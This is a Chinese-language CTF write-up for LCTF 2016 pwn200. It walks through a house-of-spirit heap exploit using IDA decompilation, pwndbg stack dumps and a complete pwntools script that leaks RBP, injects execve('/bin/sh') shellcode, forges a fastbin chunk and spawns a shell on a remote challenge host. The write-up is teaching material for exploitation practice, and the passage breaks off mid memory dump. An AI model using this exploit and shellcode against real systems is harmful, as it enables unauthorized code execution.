> 题目来源：LCTF 2016 pwn200
>
> 题目的payload来源：[https://www.jianshu.com/p/bfc86f286510](https://www.jianshu.com/p/bfc86f286510)
>
> 参考资料：[http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/](http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/)
>
> 链接: [https://pan.baidu.com/s/17LTqpqyI_m70U7Z70lnvfQ](https://pan.baidu.com/s/17LTqpqyI_m70U7Z70lnvfQ)  密码: ikiq
>
> --来自百度网盘超级会员V3的分享
>

# 准备工作
首先看一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603241382585-f1992c06-47e3-4b3a-a2d4-5e824e436825.png)

可以看到。基本上没有保护，毕竟2016年的老程序了。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603241464912-4422d689-828a-47e5-a416-44f073765749.png)

上面这张图是我本机上libc版本和ubuntu的版本

# IDA静态分析
拖入IDA中，查看一下伪代码

## main函数
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603241673427-be9c022b-40b0-4a43-a710-7f517cd8c06a.png)

main函数中的第一个函数sub_40079D()的功能是设置程序的缓冲区，这里就不用管了。

主要来看第二个函数sub_400A8E()

## main->sub_400A8E
> 根据函数是否有返回值来确定函数的类型是否改为void
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603242561340-4372075d-743f-4f5d-9892-0ee0ab1e17b7.png)

```c
#include<stdio.h>
int main(){
	int num = 0;
	for(int i = 0; i<=47;i++){
		num+=1;
	}
	printf("%d",num);
	return 0;
}
//48
```

如果你和我一样害怕看循环的次数出错（主要是菜），可以写个代码运行一下就知道了。

由于循环的次数为48次，而定义变量v1的时候分配了48字节。假如说我们在输入的时候将这48字节的空间填满，根据printf的特性，在打印的时候会泄露出栈ebp的地址，可以结合IDA看一下：

> 注意：printf打印字符串直到\x00为止
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603242821325-9d23123f-c0b5-4f31-a10f-bd631fc86cef.png)

双击v1进入到IDA的stack结构界面：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603242880173-f3debce4-7b36-4d11-b40b-2412922cf8fd.png)

```c
-0000000000000040 var_40          dq ?
-0000000000000038 var_38          dq ?
-0000000000000030 var_30          db 48 dup(?)  //变量v1
+0000000000000000  s              db 8 dup(?)   //sub_400A8E的栈底
+0000000000000008  r              db 8 dup(?)   //函数的返回地址，返回到地址0x400B59（main）
+0000000000000010
+0000000000000010 ; end of stack variables
```

可以看到变量v1和栈底是相连在一起的。更详细的内容可以看之后的动态调试。

## main->sub_400A8E->sub_4007DF
> 请注意，这个函数具有返回值
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603243134023-98deaab1-ab6d-4c85-ae26-96c67e523a15.png)

> 菜鸟教程：
>
> C 库函数 **int atoi(const char *str)** 把参数 **str** 所指向的字符串转换为一个整数（类型为 int 型）。
>
> 下面是 atoi() 函数的声明。
>
> <font style="color:#000088;">int</font><font style="color:#000000;"> atoi</font><font style="color:#666600;">(</font><font style="color:#000088;">const</font><font style="color:#000000;"> </font><font style="color:#000088;">char</font><font style="color:#000000;"> </font><font style="color:#666600;">*</font><font style="color:#000000;">str</font><font style="color:#666600;">)</font>
>
> + **str** -- 要转换为整数的字符串。
>
> 该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。
>

因此，这个函数是用来输入数字并将输入的内容转化成int类型数据。

## main->sub_400A8E->sub_400A29
进入函数sub_400A29，同样，该函数的类型为void

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603243679253-326d0230-a2da-4d81-8092-11d46d833df9.png)

这个函数开头就malloc了0x40的堆空间，然后将chunk的data段地址赋值给了dest（v0），之后调用read函数让我们输入"money"保存到buf中。但这里值得注意的是：buf的大小是0x32，而read可以读0x40个数据，在经过strcpy之后会造成overflow，而被盖掉的是dest，也就是保存malloc出来的chunk地址。将申请出来的chunk的data段地址传入了函数sub_4009C4。

这个函数的栈结构如下：

```c
-0000000000000040 ; D/A/*   : change type (data/ascii/array)
-0000000000000040 ; N       : rename
-0000000000000040 ; U       : undefine
-0000000000000040 ; Use data definition commands to create local variables and function arguments.
-0000000000000040 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000040 ; Frame size: 40; Saved regs: 8; Purge: 0
-0000000000000040 ;
-0000000000000040
-0000000000000040 buf             db ?
......(省略的内容均为buf的栈空间)
-0000000000000008 dest            dq ?                    ; offset  //存放malloc_data地址
+0000000000000000  s              db 8 dup(?)   //函数sub_400A29的栈底
+0000000000000008  r              db 8 dup(?)   //返回地址，返回到地址0x400B34（sub_400A8E）
+0000000000000010
+0000000000000010 ; end of stack variables
```

ptr是void类型的全局指针

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603245116835-805c6dd1-43ad-4e85-840b-6ae3855ce40e.png)

值得一提的是strcpy函数，这个函数将buf中的数值复制到chunk中，但是strcpy函数有个特点就是遇到\x00就会终止复制，所以这个步骤实际上是可以被绕过的。

## main->sub_400A8E->sub_400A29->sub_4009C4
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603244714255-09df4af0-4f90-43a8-aa71-574e6a85f30f.png)

## main->sub_400A8E->sub_400A29->sub_4009C4->sub_4009AF
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603244816771-4e97feef-4dde-4084-938d-60857aa888a9.png)

```c
=======EASY HOTEL========
1. check in
2. check out
3. goodbye
your choice : 
```

这是一个界面函数，不用管了。

## main->sub_400A8E->sub_400A29->sub_4009C4->sub_4007DF
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603244983099-c6544eab-7ea3-4b42-ad6f-f242561a1289.png)

这个函数之前分析过了，可以看到有返回值。

## main->sub_400A8E->sub_400A29->sub_4009C4->sub_40096D
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603246305197-fa20141a-7de3-4a41-af10-7234e6d3d8f0.png)

这个函数根据ptr指针来判断用户是否登录，当然根据前面的内容可以知道ptr所指向的的地址可以被篡改。

## main->sub_400A8E->sub_400A29->sub_4009C4->sub_4008B7
```c
void __cdecl sub_4008B7()
{
  size_t nbytes; // [rsp+Ch] [rbp-4h]

  if ( ptr )
  {
    puts("already check in");    //检查用户是否登录
  }
  else
  {
    puts("how long?");
    LODWORD(nbytes) = sub_4007DF();  //调用函数进行输入
    if ( (signed int)nbytes <= 0 || (signed int)nbytes > 128 )
    {
      puts("invalid length");
    }
    else
    {
      ptr = malloc((signed int)nbytes);  //创建堆块
      printf("give me more money : ");
      printf("\n%d\n", (unsigned int)nbytes);
      read(0, ptr, (unsigned int)nbytes);  //向堆中写入内容
      puts("in~");
    }
  }
}
```

程序大概看完了，接下来动态调试看一下。

# pwndbg动态分析
## 了解程序的内存分布
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603248747593-5d184108-f7b7-4788-9246-9bb5d37e9467.png)

按照这个程序的输入来进行gdb调试

```c
➜  House Of Spirit gdb pwn200 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from pwn200...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/fastbin_attack/House Of Spirit/pwn200 
who are u?
123
123, welcome to ISCC~ 
give me your id ~~?
456
give me money~
789

=======EASY HOTEL========
1. check in
2. check out
3. goodbye
your choice : 
```

查看一下内存分布：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603248977264-a291c4ee-a522-4a23-b27f-62dcd484fff0.png)

查看一下堆的内容：

```powershell
pwndbg> heap
Allocated chunk
Addr: 0x603000
Size: 0x00

pwndbg> top_chunk
Top chunk
Addr: 0x603050
Size: 0x00
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000603050 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000051 #chunk
0x603010:	0x00007fff0a393837	0x0000000000000000
					#393837(小端序)，也就是我们输入的789,至于前面的7fff应该是之前写入的内容
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000020fb1 #top_chunk
0x603060:	0x0000000000000000	0x0000000000000000
......（省略内容均为空）
0x6030e0:	0x0000000000000000	0x0000000000000000
pwndbg> stack
```

再来看一下此时的栈：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603251076461-3ee189ad-7e01-4511-9d7f-f0995c01cf0a.png)

查看这个程序的调用栈：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1603250049216-823ea545-f12b-43fe-a32a-5dfc6ca2b63e.png)

查看一下此时0x7fffffffdc98地址的内容：

```powershell
pwndbg> x/50gx 0x7fffffffdc98
0x7fffffffdc98:	0x0000000000400824	0x000000000000000e
0x7fffffffdca8:	0x0000000000000000	0x00007fffffffdcd0
0x7fffffffdcb8:	0x00000000004009e0	0x0000000000000000
0x7fffffffdcc8:	0x00007ffff7ffe168	0x00007fffffffdd20
0x7fffffffdcd8:	0x0000000000400a8c	0x00007fff0a393837 
																		#buf输入到了这里
0x7fffffffdce8:	0x0000000000000000	0x0000000000000000
0x7fffffffdcf8:	0x00007ffff7a43ea0	0x0000000000000009
0x7fffffffdd08:	0x00000000004008b5	0x0000000000363534
																		#id输入到了这里
0x7fffffffdd18:	0x0000000000603010	0x00007fffffffdd80
								#chunk_data的起始地址
0x7fffffffdd28:	0x0000000000400b34	0x00007ffff7dd18e0
0x7fffffffdd38:	0x00007ffff7fdc700	0x0000000000000003
0x7fffffffdd48:	0x00000000000001c8	0x00007fff00333231 
																		#name输入到了这里
0x7fffffffdd58:	0x00007ffff7a7cfc4	0x0000000000000000
0x7fffffffdd68:	0x0000000000000000	0x00007fffffffdd80
0x7fffffffdd78:	0x00000000004007dd	0x00007fffffffdda0
0x7fffffffdd88:	0x0000000000400b59	0x00007fffffffde88
								#sub_400A8E的返回地址
0x7fffffffdd98:	0x0000000100000000	0x0000000000400b60
																		#rbp的内容
0x7fffffffdda8:	0x00007ffff7a2d840	0x0000000000000001
0x7fffffffddb8:	0x00007fffffffde88	0x00000001f7ffcca0
0x7fffffffddc8:	0x0000000000400b36	0x0000000000000000
0x7fffffffddd8:	0x93858522fbc51f63	0x00000000004006b0
0x7fffffffdde8:	0x00007fffffffde80	0x0000000000000000
0x7fffffffddf8:	0x0000000000000000	0x6c7a7a5d56651f63
0x7fffffffde08:	0x6c7a6ae742f51f63	0x0000000000000000
0x7fffffffde18:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

来看一下溢出之后的情况，我们输入程序能输入的最大空间，重新调试一下：（可以结合IDA）

> 可以多次尝试数据长度直到程序异常或崩溃
>

```c
输入：
name：11111111111111111111111111111111111111111111111
id：222
buf：333333333333333333333333333333333333333333333333333333333333333
```

```c
➜  House Of Spirit gdb pwn200 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from pwn200...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/fastbin_attack/House Of Spirit/pwn200 
who are u?
111111111111111111111111111111111111111111111111
111111111111111111111111111111111111111111111111, welcome to ISCC~ 
give me your id ~~?
222
give me money~
333333333333333333333333333333333333333333333333333333333333333

Program received signal SIGSEGV, Segmentation fault.
__strcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/strcpy-sse2-unaligned.S:313
313	../sysdeps/x86_64/multiarch/strcpy-sse2-unaligned.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0xa33333333333333 ('3333333\n')
 RBX  0x0
 RCX  0x20
 RDX  0x0
 RDI  0xa33333333333333 ('3333333\n')
 RSI  0x7fffffffdce0 ◂— 0x3333333333333333 ('33333333')
 R8   0x7ffff7fdc700 ◂— add    bh, al /* 0x7ffff7fdc700 */
 R9   0xd
 R10  0x5d
 R11  0x7ffff7ab2a50 (__strcpy_sse2_unaligned) ◂— mov    rcx, rsi
 R12  0x4006b0 ◂— xor    ebp, ebp
 R13  0x7fffffffde80 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdd20 —▸ 0x7fffffffdd80 —▸ 0x7fffffffdda0 —▸ 0x400b60 ◂— push   r15
 RSP  0x7fffffffdcd8 —▸ 0x400a77 ◂— mov    rax, qword ptr [rbp - 8]
 RIP  0x7ffff7ab2c91 (__strcpy_sse2_unaligned+577) ◂— movdqu xmmword ptr [rdi], xmm1
──────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x7ffff7ab2c91 <__strcpy_sse2_unaligned+577>    movdqu xmmword ptr [rdi], xmm1
   0x7ffff7ab2c95 <__strcpy_sse2_unaligned+581>    pmovmskb edx, xmm0
   0x7ffff7ab2c99 <__strcpy_sse2_unaligned+585>    test   rdx, rdx
   0x7ffff7ab2c9c <__strcpy_sse2_unaligned+588>    jne    __strcpy_sse2_unaligned+672 <__strcpy_sse2_unaligned+672>
    ↓
   0x7ffff7ab2cf0 <__strcpy_sse2_unaligned+672>    add    rsi, 0x10
   0x7ffff7ab2cf4 <__strcpy_sse2_unaligned+676>    add    rdi, 0x10
   0x7ffff7ab2cf8 <__strcpy_sse2_unaligned+680>    bsf    rdx, rdx
   0x7ffff7ab2cfc <__strcpy_sse2_unaligned+684>    lea    r11, [rip + 0xe20c5]
   0x7ffff7ab2d03 <__strcpy_sse2_unaligned+691>    movsxd rcx, dword ptr [r11 + rdx*4]
   0x7ffff7ab2d07 <__strcpy_sse2_unaligned+695>    lea    rcx, [r11 + rcx]
   0x7ffff7ab2d0b <__strcpy_sse2_unaligned+699>    jmp    rcx
──────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffdcd8 —▸ 0x400a77 ◂— mov    rax, qword ptr [rbp - 8]
01:0008│ rsi  0x7fffffffdce0 ◂— 0x3333333333333333 ('33333333')
... ↓
────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0     7ffff7ab2c91 __strcpy_sse2_unaligned+577
   f 1           400a77
   f 2           400b34
   f 3           400b59
   f 4     7ffff7a2d840 __libc_start_main+240
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

再来看一下0x7fffffffdc98的内存：（stack）

```powershell
pwndbg> x/50gx 0x7fffffffdc98
0x7fffffffdc98:	0x00007ffff7a8782b	0x000000000000000e
0x7fffffffdca8:	0x00007ffff7dd2620	0x0000000000400cb7
0x7fffffffdcb8:	0x00007ffff7a7c80a	0x0000000000000000
0x7fffffffdcc8:	0x00007ffff7ffe168	0x0000000000000001
0x7fffffffdcd8:	0x0000000000400a77	0x3333333333333333
																		#buf输入到了这里
0x7fffffffdce8:	0x3333333333333333	0x3333333333333333
0x7fffffffdcf8:	0x3333333333333333	0x3333333333333333
0x7fffffffdd08:	0x3333333333333333	0x3333333333333333
																		#id输入到了这里
0x7fffffffdd18:	0x0a33333333333333	0x00007fffffffdd80
								#chunk_data的起始地址
0x7fffffffdd28:	0x0000000000400b34	0x00007ffff7dd18e0
0x7fffffffdd38:	0x00007ffff7fdc700	0x000000000000002f
0x7fffffffdd48:	0x00000000000000de	0x3131313131313131
																		#name输入到了这里
0x7fffffffdd58:	0x3131313131313131	0x3131313131313131
0x7fffffffdd68:	0x3131313131313131	0x3131313131313131
0x7fffffffdd78:	0x3131313131313131	0x00007fffffffdda0 #printf会泄露的内容
0x7fffffffdd88:	0x0000000000400b59	0x00007fffffffde88
0x7fffffffdd98:	0x0000000100000000	0x0000000000400b60
0x7fffffffdda8:	0x00007ffff7a2d840	0x0000000000000001
0x7fffffffddb8:	0x00007fffffffde88	0x00000001f7ffcca0
0x7fffffffddc8:	0x0000000000400b36	0x0000000000000000
0x7fffffffddd8:	0x1efe2cb42350acf8	0x00000000004006b0
0x7fffffffdde8:	0x00007fffffffde80	0x0000000000000000
0x7fffffffddf8:	0x0000000000000000	0xe101d3cb8ef0acf8
0x7fffffffde08:	0xe101c3719a60acf8	0x0000000000000000
0x7fffffffde18:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

这就是溢出的情况，从上面可以看到，当输入buf之后，程序会直接崩溃。

## exp
先贴上exp吧，可以先大致看一下：

```python
from pwn import *
elf = ELF("./pwn200")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh = 0

def init(leak):
	sh.sendafter("who are u?\n",leak)

def fake(payload):
	sh.sendlineafter("give me your id ~~?","31")
	sh.sendafter("give me money~",payload)

def checkin(idx,payload):
	sh.sendlineafter("your choice : ","1")
	sh.sendlineafter("how long?\n",str(idx))
	sh.sendafter(str(idx)+'\n',payload)

def checkout():
	sh.sendlineafter("your choice : ","2")

def main(ip,port,debug,mode):
	global sh
	if debug==0:
		context.log_level = "debug"
	else:
		pass
	if mode==0:
		sh = process("pwn200")
	else:
		sh = remote(ip,port)

	#Step 1: leaking $RBP
	#gdb.attach(sh)
	init('a'*0x30)	#leak reg_RBP to caculate &shellcode
	#start leaking
	sh.recvuntil("a"*0x30)
	reg_RBP = u64(sh.recv(6).ljust(8,"\x00"))
	success("RBP register ===> "+hex(reg_RBP))

	#Step 2: fake chunk
				# "\x00" to cut off strcpy()
	shellcode = "\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
	shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
	shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"
	payload = (shellcode+p64(0)*2+p64(0x41)).ljust(0x38,'\x00')
	payload = payload+p64(reg_RBP-0x90)
	fake(payload)
	#gdb.attach(sh)
	checkout()
	#gdb.attach(sh)
	checkin(0x30,p64(0)*3+p64(reg_RBP - 0xc0 + 1))
	#gdb.attach(sh)
	sh.recv()
	
	sh.sendline('3')
	sh.interactive()

if __name__ == '__main__':
	main("node3.buuoj.cn","25309",0,0)
```

### exp讲解
### 利用思路
1. 将shellcode.ljust(48,’a’)输入到name中，通过`off-by-one`漏洞打印出来main函数栈底，通过上面结构图能够算出shellcode的地址，选取一个处在money中的位置作为fake_chunk
2. 在money中伪造堆块size，在id里面输入的是下一个堆块的size(大小不能小于 `2 * SIZE_SZ`，同时也不能大于`av->system_mem`)，同时通过堆溢出漏洞覆盖掉dest
3. free掉刚才伪造的堆块，使其进入fastbin
4. 申请堆块，申请出来以后还是在老位置。
5. 输入数据到刚申请的堆块中，覆盖掉leave指令，让之后的rip指向shellcode，完成劫持，执行shellcode。

> 注意：
>
> 在执行gdb.attach附加调试时，会将栈的地址随机化。以下讲解的内存地址是程序直接执行时的内存地址
>

#### 程序加载及程序输入输出自动化
```python
from pwn import *
elf = ELF("./pwn200")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh = 0

def init(leak):
	sh.sendafter("who are u?\n",leak)

def fake(payload):
	sh.sendlineafter("give me your id ~~?","31")
	sh.sendafter("give me money~",payload)

def checkin(idx,payload):
	sh.sendlineafter("your choice : ","1")
	sh.sendlineafter("how long?\n",str(idx))
	sh.sendafter(str(idx)+'\n',payload)

def checkout():
	sh.sendlineafter("your choice : ","2")
```

#### 泄露sub_400A8E的栈底
```c
	#Step 1: leaking $RBP
	#gdb.attach(sh)
	init('a'*0x30)	#leak reg_RBP to caculate &shellcode
	#start leaking
	sh.recvuntil("a"*0x30)
	reg_RBP = u64(sh.recv(6).ljust(8,"\x00"))
	success("RBP register ===> "+hex(reg_RBP))
    #rbp=0x7fffffffdda0
```

当执行这些代码之后，内存空间所示如下：

> 以下内存是在程序正常运行时最开始3次输入完成之后得到的，仅供参考。
>
> 开始输入的内容分别为：123，456，789
>
> 有些地方不准确，之后会提到。
>

```c
#发送payload之后(输入name之后),泄露rbp
#泄露出来的值为：0x00007fffffffdda0 
pwndbg>  x/50gx 0x7fffffffdc98
0x7fffffffdc98: 0x0000000000400824  0x000000000000000e
0x7fffffffdca8: 0x0000000000000000  0x00007fffffffdcd0
0x7fffffffdcb8: 0x00000000004009e0  0x0000000000000000
0x7fffffffdcc8: 0x00007ffff7ffe168  0x00007fffffffdd20
0x7fffffffdcd8: 0x0000000000400a8c  0x????????????????
    								#buf从这里开始
0x7fffffffdce8: 0x????????????????	0x????????????????
0x7fffffffdcf8: 0x00007ffff7a43ea0  0x0000000000000009
0x7fffffffdd08: 0x00000000004008b5  0x0000000000??????
    								#输入的id内容
									#此内容所在的地址为：0x7fffffffdd10
0x7fffffffdd18: 0x0000000000603010  0x00007fffffffdd80
0x7fffffffdd28: 0x0000000000400b34  0x00007ffff7dd18e0
0x7fffffffdd38: 0x00007ffff7fdc700  0x0000000000000003
0x7fffffffdd48: 0x00000000000001c8  0x6161616161616161 
    			#输入的id大小 		 #name从这里开始
0x7fffffffdd58: 0x6161616161616161  0x6161616161616161
0x7fffffffdd68: 0x6161616161616161  0x6161616161616161
0x7fffffffdd78: 0x6161616161616161  0x00007fffffffdda0 
    								#printf会泄露的内容：&rbp
0x7fffffffdd88: 0x0000000000400b59  0x00007fffffffde88
0x7fffffffdd98: 0x0000000100000000  0x0000000000400b60
    								#rbp，内容所在的地址为：0x7fffffffdda0
0x7fffffffdda8: 0x00007ffff7a2d840  0x0000000000000001
    			#d840是main函数的返回地址
0x7fffffffddb8: 0x00007fffffffde88  0x00000001f7ffcca0
0x7fffffffddc8: 0x0000000000400b36  0x0000000000000000
0x7fffffffddd8: 0x35e7fe72fd004534  0x00000000004006b0
0x7fffffffdde8: 0x00007fffffffde80  0x0000000000000000
0x7fffffffddf8: 0x0000000000000000  0xca18010d50a04534
0x7fffffffde08: 0xca1811b744304534  0x0000000000000000
0x7fffffffde18: 0x0000000000000000  0x0000000000000000
Pwndbg> 
```



#### 伪造fake_chunk
```python
	#Step 2: fake chunk
	# "\x00" to cut off strcpy()
	shellcode = "\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
	shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
	shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"
	payload = (shellcode+p64(0)*2+p64(0x41)).ljust(0x38,'\x00')
	payload = payload+p64(reg_RBP-0x90)
	fake(payload)
'''
def fake(payload):
	sh.sendlineafter("give me your id ~~?","31")
	sh.sendafter("give me money~",payload)
        
'''
```

```c
#向栈中写入payload和shellcode，结果如下：
#&rbp-90==0x7fffffffdd10
pwndbg>  x/50gx 0x7fffffffdc98
0x7fffffffdc98: 0x0000000000400824  0x000000000000000e
0x7fffffffdca8: 0x0000000000000000  0x00007fffffffdcd0
0x7fffffffdcb8: 0x00000000004009e0  0x0000000000000000
0x7fffffffdcc8: 0x00007ffff7ffe168  0x00007fffffffdd20
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#payload更改的内容：
0x7fffffffdcd8: 0x0000000000400a8c  0x69622fbb48f63100 #shellcode_start
    								#buf从这里开始
0x7fffffffdce8: 0x54535668732f2f6e	0x050fd231583b6a5f #shellcode_end
0x7fffffffdcf8: 0x0000000000000000  0x0000000000000000
0x7fffffffdd08: 0x0000000000000041  0x0000000000000000
    								#输入的id内容
									#此内容所在的地址为：0x7fffffffdd10
0x7fffffffdd18: 0x00007fffffffdd10  0x00007fffffffdd80
    			#ptr现在被修改为指向0x00007fffffffdd10
    			#也就是说堆块的地址被修改为：0x00007fffffffdd00
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''    
0x7fffffffdd28: 0x0000000000400b34  0x00007ffff7dd18e0
0x7fffffffdd38: 0x00007ffff7fdc700  0x0000000000000003
0x7fffffffdd48: 0x00000000000001c8  0x6161616161616161 
    			#输入的id大小		 #name从这里开始
0x7fffffffdd58: 0x6161616161616161  0x6161616161616161
0x7fffffffdd68: 0x6161616161616161  0x6161616161616161
0x7fffffffdd78: 0x6161616161616161  0x00007fffffffdda0 
    								#printf会泄露的内容：&rbp
0x7fffffffdd88: 0x0000000000400b59  0x00007fffffffde88
0x7fffffffdd98: 0x0000000100000000  0x0000000000400b60
    								#rbp，内容所在的地址为：0x7fffffffdda0
0x7fffffffdda8: 0x00007ffff7a2d840  0x0000000000000001
    			#d840是main函数的返回地址
0x7fffffffddb8: 0x00007fffffffde88  0x00000001f7ffcca0
0x7fffffffddc8: 0x0000000000400b36  0x0000000000000000
0x7fffffffddd8: 0x35e7fe72fd004534  0x00000000004006b0
0x7fffffffdde8: 0x00007fffffffde80  0x0000000000000000
0x7fffffffddf8: 0x0000000000000000  0xca18010d50a04534
0x7fffffffde08: 0xca1811b744304534  0x0000000000000000
0x7fffffffde18: 0x0000000000000000  0x0000000000000000
Pwndbg> 
```

向栈中写入payload之前会进行malloc，malloc之后ptr指针指向的地址被修改为0x7fffffffdd10，但是进行strcpy有\x00截断，因此向栈中写入的payload并不会被破坏。

> malloc_chunk_start_addr=0x00007fffffffdd00
>
> 现在指针ptr指向：0x00007fffffffdd10
>

```c
void sub_400A29()
{
  char *v0; // rdi
  char buf; // [rsp+0h] [rbp-40h]
  char *dest; // [rsp+38h] [rbp-8h]

  dest = (char *)malloc(0x40uLL); //代码已执行
  puts("give me money~"); //代码已执行
  read(0, &buf, 0x40uLL); //代码已执行
  v0 = dest; //执行此代码之后：v0==0x7fffffffdd10
  strcpy(dest, &buf); //此代码阻止写入的payload被破坏
  ptr = dest; //执行此代码之后：v0==0x7fffffffdd10
  sub_4009C4(); //调用函数
}
```

> 这里注意在house of spirit中伪造chunk的条件，之后会说。<font style="color:#F5222D;"></font>
>

#### 执行登出操作
```c
void sub_40096D()
{
  if ( ptr )  //ptr现在指向0x00007fffffffdd10
  {
    puts("out~");
    free(ptr);
    ptr = 0LL;
  }
  else
  {
    puts("havn't check in");
  }
}
```

```c
#free指针并将指针置空之后，结果如下：
#&rbp-90==0x7fffffffdd10
pwndbg>  x/50gx 0x7fffffffdc98
0x7fffffffdc98: 0x0000000000400824  0x000000000000000e
0x7fffffffdca8: 0x0000000000000000  0x00007fffffffdcd0
0x7fffffffdcb8: 0x00000000004009e0  0x0000000000000000
0x7fffffffdcc8: 0x00007ffff7ffe168  0x00007fffffffdd20
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#payload更改的内容：
0x7fffffffdcd8: 0x0000000000400a8c  0x69622fbb48f63100 #shellcode_start
    								#buf从这里开始
0x7fffffffdce8: 0x54535668732f2f6e	0x050fd231583b6a5f #shellcode_end
0x7fffffffdcf8: 0x0000000000000000  0x0000000000000000
0x7fffffffdd08: 0x0000000000000041  0x0000000000000000
    								#输入的id内容
									#此内容所在的地址为：0x7fffffffdd10
0x7fffffffdd18: 0x00007fffffffdd10  0x00007fffffffdd80
    			#ptr现在被修改为指向NULL
    			#由于原来ptr指向的地址为0x7fffffffdd10
    			#因此fastbin中的chunk地址为：0x7fffffffdd00
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''    
0x7fffffffdd28: 0x0000000000400b34  0x00007ffff7dd18e0
0x7fffffffdd38: 0x00007ffff7fdc700  0x0000000000000003
0x7fffffffdd48: 0x00000000000001c8  0x6161616161616161 
    			#输入的id大小		 #name从这里开始
0x7fffffffdd58: 0x6161616161616161  0x6161616161616161
0x7fffffffdd68: 0x6161616161616161  0x6161616161616161
0x7fffffffdd78: 0x6161616161616161  0x00007fffffffdda0 
    								#printf会泄露的内容：&rbp
0x7fffffffdd88: 0x0000000000400b59  0x00007fffffffde88
0x7fffffffdd98: 0x0000000100000000  0x0000000000400b60
    								#rbp，内容所在的地址为：0x7fffffffdda0
0x7fffffffdda8: 0x00007ffff7a2d840  0x0000000000000001
